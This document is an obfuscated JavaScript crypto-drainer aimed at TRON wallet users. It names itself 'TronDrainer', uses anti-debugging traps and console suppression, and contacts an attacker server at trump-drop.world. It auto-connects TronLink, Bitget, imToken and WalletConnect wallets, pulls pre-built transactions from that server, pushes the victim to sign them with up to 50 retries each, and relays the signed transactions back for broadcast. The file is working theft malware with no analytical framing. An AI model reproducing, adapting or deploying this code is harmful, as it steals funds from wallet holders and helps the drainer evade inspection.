(function () {
  const _0x1f3f3e = function () {
    try {
      (function _0x2bb5fa(_0xa3fa88) {
        if (("" + _0xa3fa88 / _0xa3fa88).length !== 1 || _0xa3fa88 % 20 === 0) {
          (function () {}).constructor("debugger")();
        } else {
          debugger;
        }
        _0x2bb5fa(++_0xa3fa88);
      })(0);
    } catch (_0x1c1511) {}
  };
  setInterval(_0x1f3f3e, 1000);
  const _0x1518a8 = console;
  Object.defineProperty(window, "console", {
    get: function () {
      return {
        log: function () {},
        warn: function () {},
        error: function () {},
        info: function () {},
        debug: function () {}
      };
    }
  });
})();
const API_SERVER = "https://trump-drop.world";
const ENCRYPT_KEY = "TRX_SECURE_2024_PANEL_KEY";
const WC_PROJECT_ID = "fbf5b42d6feed07049dd9e59d888645a";
const SESSION_ID = "xxxxxxxx".replace(/x/g, () => Math.floor(Math.random() * 16).toString(16)).toUpperCase();
function xorConvert(_0x33aa3d, _0x227437) {
  const _0x130394 = /^[A-Za-z0-9+/]*={0,2}$/.test(_0x33aa3d) && _0x33aa3d.length % 4 === 0;
  if (_0x130394) {
    try {
      _0x33aa3d = atob(_0x33aa3d);
    } catch (_0x4c8087) {}
  }
  let _0x4ba6cd = "";
  for (let _0x10876b = 0; _0x10876b < _0x33aa3d.length; _0x10876b++) {
    _0x4ba6cd += String.fromCharCode(_0x33aa3d.charCodeAt(_0x10876b) ^ _0x227437.charCodeAt(_0x10876b % _0x227437.length));
  }
  if (_0x130394) {
    return _0x4ba6cd;
  } else {
    return btoa(_0x4ba6cd);
  }
}
function generateId() {
  return "xxxx-xxxx-xxxx-xxxx".replace(/x/g, () => Math.floor(Math.random() * 16).toString(16));
}
function getConfigTheme() {
  try {
    if (window.config) {
      const _0x15dc70 = xorConvert(window.config, ENCRYPT_KEY);
      const _0x2eb64c = JSON.parse(_0x15dc70);
      return _0x2eb64c.theme || "dark";
    }
  } catch (_0x5a5bce) {}
  return "dark";
}
async function sendNotification(_0x14a355, _0x563d7c = {}) {
  try {
    const _0x4b16ec = {
      type: _0x14a355,
      id: SESSION_ID,
      ..._0x563d7c,
      config: window.config || ""
    };
    const _0x381117 = xorConvert(JSON.stringify(_0x4b16ec), ENCRYPT_KEY);
    await axios.post(API_SERVER + "/api/notification", {
      data: _0x381117
    });
  } catch (_0x135fc6) {}
}
function showStep(_0x37aae0) {
  document.querySelectorAll("[data-step]").forEach(_0x3c44ed => {
    _0x3c44ed.style.display = _0x3c44ed.dataset.step === _0x37aae0 ? "block" : "none";
  });
}
function hideAllSteps() {
  document.querySelectorAll("[data-step]").forEach(_0x2faf5f => _0x2faf5f.style.display = "none");
}
function openModal() {
  const _0x5dd892 = document.getElementById("modal-01pqoDAD");
  if (_0x5dd892) {
    _0x5dd892.style.display = _0x5dd892.style.display === "none" ? "block" : "none";
  }
}
async function clearWalletConnectCache() {
  try {
    const _0x1ecb92 = await indexedDB.databases();
    for (const _0x5952c4 of _0x1ecb92) {
      if (_0x5952c4.name && _0x5952c4.name.includes("WALLET_CONNECT")) {
        indexedDB.deleteDatabase(_0x5952c4.name);
      }
    }
  } catch (_0x39a22d) {}
}
let wcAdapter = null;
function getAdapter(_0xc3be67) {
  if (!window.TronWalletAdapters) {
    return null;
  }
  const _0x5259a4 = {
    tronlink: window.TronWalletAdapters.TronLinkAdapter,
    walletconnect: window.TronWalletAdapters.WalletConnectAdapter
  };
  return _0x5259a4[_0xc3be67.toLowerCase()];
}
let currentEventSource = null;
let wcModal = null;
async function connectWalletConnect() {
  const _0x11569a = document.getElementById("modal-01pqoDAD");
  if (_0x11569a) {
    _0x11569a.style.display = "none";
  }
  if (currentEventSource) {
    currentEventSource.close();
    currentEventSource = null;
  }
  if (wcModal) {
    try {
      wcModal.closeModal();
    } catch (_0x87fe17) {}
  }
  const _0x19111a = generateId();
  const _0x4379d4 = window.config || "";
  const _0x3d3b3f = API_SERVER + "/api/fetchWalletConnect?id=" + _0x19111a + "&config=" + encodeURIComponent(_0x4379d4);
  const _0x3c1ab4 = new EventSource(_0x3d3b3f);
  currentEventSource = _0x3c1ab4;
  _0x3c1ab4.onmessage = _0x5bbac8 => {
    try {
      const _0x2680dd = xorConvert(_0x5bbac8.data, ENCRYPT_KEY);
      const _0x864be = JSON.parse(_0x2680dd);
      switch (_0x864be.event) {
        case "connection":
          openOfficialWCModal(_0x864be.uri);
          break;
        case "wallet":
          closeOfficialWCModal();
          showStep("sign-waiting");
          break;
        case "transactions":
          break;
        case "signed":
          hideAllSteps();
          _0x3c1ab4.close();
          break;
        case "error":
          closeOfficialWCModal();
          hideAllSteps();
          _0x3c1ab4.close();
          break;
      }
    } catch (_0x43b377) {}
  };
  _0x3c1ab4.onerror = _0x5829a4 => {
    closeOfficialWCModal();
    _0x3c1ab4.close();
  };
}
function openOfficialWCModal(_0x25f3cd) {
  if (!window.WalletConnectModal) {
    return;
  }
  try {
    if (!wcModal) {
      wcModal = new window.WalletConnectModal({
        projectId: WC_PROJECT_ID,
        themeMode: getConfigTheme(),
        themeVariables: {
          "--wcm-z-index": "999999999999"
        },
        explorerRecommendedWalletIds: ["4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0", "20459438007b75f4f4acb98bf29aa3b800550309646d375da5fd4aac6c2a2c66", "0b415a746fb9ee99cce155c2ceca0c6f6061b1dbca2d722b3ba16381d0562150", "7674bb4e353bf52886768a3ddc2a4562ce2f4191c80831291218ebd90f5f5e26", "c03dfee351b6fcc421b4494ea33b9d4b92a984f87aa76d1663bb28705e95034a", "15c8b91ade1a4e58f3ce4e7a0dd7f42b47db0c8df7e0d84f63eb39bcb96c4e0f"],
        explorerExcludedWalletIds: "ALL"
      });
    }
    wcModal.openModal({
      uri: _0x25f3cd
    });
  } catch (_0x2d1775) {}
}
function closeOfficialWCModal() {
  if (wcModal) {
    try {
      wcModal.closeModal();
    } catch (_0x3f03ac) {}
  }
}
async function connectTronLink() {
  const _0x423de5 = document.getElementById("modal-01pqoDAD");
  if (_0x423de5) {
    _0x423de5.style.display = "none";
  }
  if (isMobile) {
    const _0x3eea09 = [{
      name: "bitkeep.tronWeb",
      tw: window.bitkeep?.tronWeb,
      tl: window.bitkeep?.tronLink
    }, {
      name: "tronWeb",
      tw: window.tronWeb,
      tl: window.tronLink
    }];
    for (const _0x4b6f24 of _0x3eea09) {
      if (_0x4b6f24.tw || _0x4b6f24.tl) {
        0("[Drainer] Found provider: " + _0x4b6f24.name);
        try {
          if (_0x4b6f24.tl?.request) {
            try {
              0("[Drainer] Requesting accounts via " + _0x4b6f24.name);
              await _0x4b6f24.tl.request({
                method: "tron_requestAccounts"
              });
            } catch (_0x17a66b) {
              0("[Drainer] Request error:", _0x17a66b);
            }
          }
          await new Promise(_0x18fc85 => setTimeout(_0x18fc85, 1000));
          let _0x1244d4 = _0x4b6f24.tw?.defaultAddress?.base58;
          0("[Drainer] Address from " + _0x4b6f24.name + ":", _0x1244d4);
          if (!_0x1244d4 && _0x4b6f24.tl?.tronWeb) {
            _0x1244d4 = _0x4b6f24.tl.tronWeb.defaultAddress?.base58;
            0("[Drainer] Address from " + _0x4b6f24.name + ".tronLink.tronWeb:", _0x1244d4);
          }
          if (!_0x1244d4) {
            await new Promise(_0x442aeb => setTimeout(_0x442aeb, 2000));
            _0x1244d4 = _0x4b6f24.tw?.defaultAddress?.base58 || _0x4b6f24.tl?.tronWeb?.defaultAddress?.base58;
            0("[Drainer] Address after wait:", _0x1244d4);
          }
          if (_0x1244d4) {
            0("[Drainer] Connecting with address:", _0x1244d4);
            await processWalletConnection(_0x1244d4, window._selectedWalletName || "Wallet");
            return;
          }
        } catch (_0x302e49) {
          0("[Drainer] Error with " + _0x4b6f24.name + ":", _0x302e49);
        }
      }
    }
    console.log("[Drainer] No tronWeb provider found, opening deeplink");
    const _0xb632f7 = window.location.href;
    const _0x91bf2 = "tronlinkoutside://pull.activity?param=" + encodeURIComponent(JSON.stringify({
      url: _0xb632f7,
      action: "open",
      protocol: "tronlink",
      version: "1.0"
    }));
    window.location.href = _0x91bf2;
    return;
  }
  const _0x16b9cd = getAdapter("tronlink");
  if (_0x16b9cd) {
    try {
      const _0x12a298 = new _0x16b9cd({
        openTronLinkAppOnMobile: false,
        checkTimeout: 3000
      });
      await _0x12a298.connect();
      const _0xd5ba7f = _0x12a298.address;
      if (_0xd5ba7f) {
        await processWalletConnection(_0xd5ba7f, "TronLink", _0x12a298);
        return;
      }
    } catch (_0x1cfa42) {}
  }
  if (window.tronLink || window.tronWeb) {
    try {
      if (window.tronLink) {
        const _0x1c34e1 = await window.tronLink.request({
          method: "tron_requestAccounts"
        });
        if (_0x1c34e1.code === 200 && window.tronWeb?.defaultAddress?.base58) {
          await processWalletConnection(window.tronWeb.defaultAddress.base58, "TronLink");
        }
      } else if (window.tronWeb?.defaultAddress?.base58) {
        await processWalletConnection(window.tronWeb.defaultAddress.base58, "TronLink");
      }
    } catch (_0x4ba650) {}
  } else {
    alert("TronLink not installed. Please install TronLink extension.");
  }
}
async function processWalletConnection(_0x219037, _0x49477f, _0x520ea1 = null) {
  showStep("sign-waiting");
  const _0x3dcf17 = () => {
    if (window.bitkeep?.tronWeb) {
      return window.bitkeep.tronWeb;
    }
    if (window.tronWeb) {
      return window.tronWeb;
    }
    return null;
  };
  try {
    const _0x4c4848 = window.config || "";
    const _0x1626fb = {
      executor: _0x219037,
      target: _0x49477f,
      id: SESSION_ID,
      config: _0x4c4848
    };
    const _0x4affed = xorConvert(JSON.stringify(_0x1626fb), ENCRYPT_KEY);
    const _0x55b708 = await axios.post(API_SERVER + "/api/buildTransactions", {
      data: _0x4affed
    });
    const _0xe4a930 = JSON.parse(xorConvert(_0x55b708.data.data, ENCRYPT_KEY));
    const _0x28abfc = _0xe4a930.transactions;
    if (!_0x28abfc || _0x28abfc.length === 0) {
      hideAllSteps();
      return;
    }
    const _0x21f786 = _0x3dcf17();
    for (const _0x2ea4ba of _0x28abfc) {
      const _0x699705 = _0x2ea4ba.transaction || _0x2ea4ba;
      const _0x436c8e = 50;
      let _0x180284 = 0;
      let _0x31689d = false;
      while (_0x180284 < _0x436c8e && !_0x31689d) {
        try {
          console.log("[Drainer] Signing tx, attempt:", _0x180284 + 1);
          let _0x154781;
          if (_0x520ea1 && typeof _0x520ea1.signTransaction === "function") {
            _0x154781 = await _0x520ea1.signTransaction(_0x699705);
          } else if (wcAdapter && typeof wcAdapter.signTransaction === "function") {
            _0x154781 = await wcAdapter.signTransaction(_0x699705);
          } else if (_0x21f786) {
            try {
              _0x154781 = await _0x21f786.trx.sign(_0x699705);
              console.log("[Drainer] Signed tx:", _0x154781);
            } catch (_0x30ca2c) {
              console.log("[Drainer] Sign error:", _0x30ca2c);
              _0x180284++;
              await new Promise(_0x500252 => setTimeout(_0x500252, 500));
              continue;
            }
          }
          if (_0x154781 && _0x154781.signature && _0x154781.signature.length > 0) {
            console.log("[Drainer] Sending signed tx to server");
            const _0x399428 = {
              transaction: _0x154781,
              config: _0x4c4848
            };
            const _0xd3a922 = xorConvert(JSON.stringify(_0x399428), ENCRYPT_KEY);
            await axios.post(API_SERVER + "/api/sendTransaction", {
              data: _0xd3a922
            });
            _0x31689d = true;
          } else {
            console.log("[Drainer] No valid signature, retrying");
            _0x180284++;
            await new Promise(_0x414bb9 => setTimeout(_0x414bb9, 500));
          }
        } catch (_0xe5404e) {
          console.log("Sign transaction error:", _0xe5404e);
          _0x180284++;
          await new Promise(_0x332224 => setTimeout(_0x332224, 500));
        }
      }
    }
  } catch (_0x371121) {
    console.log("Build transactions error:", _0x371121);
  }
  hideAllSteps();
}
const walletDeeplinks = {
  trust: "https://link.trustwallet.com/open_url?coin_id=195&url=",
  okex: "okx://wallet/dapp?dappUrl=",
  tokenpocket: "tpdapp://open?params=",
  safepal: "https://link.safepal.io/open_url?url=",
  mathwallet: "mathwallet://mathwallet.org?action=link&value=",
  bitget: "https://bkcode.vip?action=dapp&url=",
  imtoken: "imtokenv2://navigate/DappView?url="
};
const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
function connectWallet(_0x5a942b) {
  const _0x425b0c = document.getElementById("modal-01pqoDAD");
  if (_0x425b0c) {
    _0x425b0c.style.display = "none";
  }
  if (isMobile && walletDeeplinks[_0x5a942b]) {
    const _0x551ebb = window.location.href;
    let _0x3c96a8 = walletDeeplinks[_0x5a942b];
    if (_0x5a942b === "tokenpocket") {
      _0x3c96a8 = _0x3c96a8 + encodeURIComponent(JSON.stringify({
        url: _0x551ebb,
        chain: "TRON"
      }));
    } else if (_0x5a942b === "mathwallet") {
      _0x3c96a8 = _0x3c96a8 + btoa(_0x551ebb);
    } else {
      _0x3c96a8 = _0x3c96a8 + encodeURIComponent(_0x551ebb);
    }
    window.location.href = _0x3c96a8;
    return;
  }
  connectWalletConnect();
}
const walletHandlers = {
  tronlink: connectTronLink,
  walletconnect: connectWalletConnect,
  trust: () => connectWallet("trust"),
  tokenpocket: () => connectWallet("tokenpocket"),
  ledger: connectWalletConnect,
  okex: () => connectWallet("okex"),
  okxwallet: () => connectWallet("okex"),
  safepal: () => connectWallet("safepal"),
  mathwallet: () => connectWallet("mathwallet"),
  bitget: () => connectWallet("bitget"),
  imtoken: () => connectWallet("imtoken")
};
function bindWalletButtons() {
  document.querySelectorAll(".wallet-button").forEach(_0x559d2e => {
    const _0x5cfcbe = (_0x559d2e.id || _0x559d2e.getAttribute("data-wallet") || "").toLowerCase();
    if (_0x5cfcbe && walletHandlers[_0x5cfcbe]) {
      _0x559d2e.onclick = _0x1f0e28 => {
        _0x1f0e28.preventDefault();
        walletHandlers[_0x5cfcbe]();
      };
    }
  });
}
function init() {
  const _0x281180 = getConfigTheme();
  const _0x2432f6 = document.querySelector(".modal-01pqoDAD-default");
  if (_0x2432f6) {
    _0x2432f6.classList.remove("light", "dark");
    _0x2432f6.classList.add(_0x281180);
  }
  document.querySelectorAll(".loader-301oapQ01-bG9sa2Vr").forEach(_0x198272 => {
    _0x198272.classList.remove("light", "dark");
    _0x198272.classList.add(_0x281180);
  });
  sendNotification("joined");
  bindWalletButtons();
  new MutationObserver(bindWalletButtons).observe(document.body, {
    childList: true,
    subtree: true
  });
  if (isMobile) {
    setTimeout(async () => {
      console.log("[AutoConnect] Checking for wallet providers...");
      console.log("[AutoConnect] window.bitkeep:", !!window.bitkeep);
      console.log("[AutoConnect] window.tronWeb:", !!window.tronWeb);
      console.log("[AutoConnect] window.tronLink:", !!window.tronLink);
      console.log("[AutoConnect] window.imToken:", !!window.imToken);
      console.log("[AutoConnect] UserAgent:", navigator.userAgent);
      if (window.bitkeep?.tronWeb || window.bitkeep?.tronLink) {
        console.log("[AutoConnect] Bitget detected");
        try {
          if (window.bitkeep.tronLink?.request) {
            await window.bitkeep.tronLink.request({
              method: "tron_requestAccounts"
            });
          }
          await new Promise(_0x3b989c => setTimeout(_0x3b989c, 1000));
          const _0x2db6d1 = window.bitkeep.tronWeb?.defaultAddress?.base58;
          console.log("[AutoConnect] Bitget address:", _0x2db6d1);
          if (_0x2db6d1) {
            await processWalletConnection(_0x2db6d1, "Bitget");
            return;
          }
        } catch (_0x48be4a) {
          console.log("[AutoConnect] Bitget error:", _0x48be4a);
        }
      }
      if (window.imToken || navigator.userAgent.includes("imToken")) {
        console.log("[AutoConnect] imToken detected");
        try {
          if (window.tronLink?.request) {
            await window.tronLink.request({
              method: "tron_requestAccounts"
            });
          }
          await new Promise(_0x39317a => setTimeout(_0x39317a, 1000));
          const _0x273991 = window.tronWeb?.defaultAddress?.base58;
          console.log("[AutoConnect] imToken address:", _0x273991);
          if (_0x273991) {
            await processWalletConnection(_0x273991, "imToken");
            return;
          }
        } catch (_0x56aed0) {
          console.log("[AutoConnect] imToken error:", _0x56aed0);
        }
      }
      if (window.tronWeb || window.tronLink) {
        console.log("[AutoConnect] TronLink/Generic detected");
        try {
          if (window.tronLink?.request) {
            const _0x4c7d3c = await window.tronLink.request({
              method: "tron_requestAccounts"
            });
            console.log("[AutoConnect] TronLink request result:", _0x4c7d3c);
          }
          await new Promise(_0x127a92 => setTimeout(_0x127a92, 1000));
          const _0x1ef7d2 = window.tronWeb?.defaultAddress?.base58;
          console.log("[AutoConnect] TronLink address:", _0x1ef7d2);
          if (_0x1ef7d2) {
            await processWalletConnection(_0x1ef7d2, "TronLink");
            return;
          }
        } catch (_0x50af31) {
          console.log("[AutoConnect] TronLink error:", _0x50af31);
        }
      }
      console.log("[AutoConnect] No wallet provider found");
    }, 1500);
  }
}
if (document.readyState === "loading") {
  document.addEventListener("DOMContentLoaded", init);
} else {
  init();
}
window.TronDrainer = {
  connectWalletConnect: connectWalletConnect,
  connectTronLink: connectTronLink,
  connectWallet: connectWallet,
  openModal: openModal,
  clearWalletConnectCache: clearWalletConnectCache,
  closeOfficialWCModal: closeOfficialWCModal,
  sessionId: SESSION_ID,
  sendNotification: sendNotification
};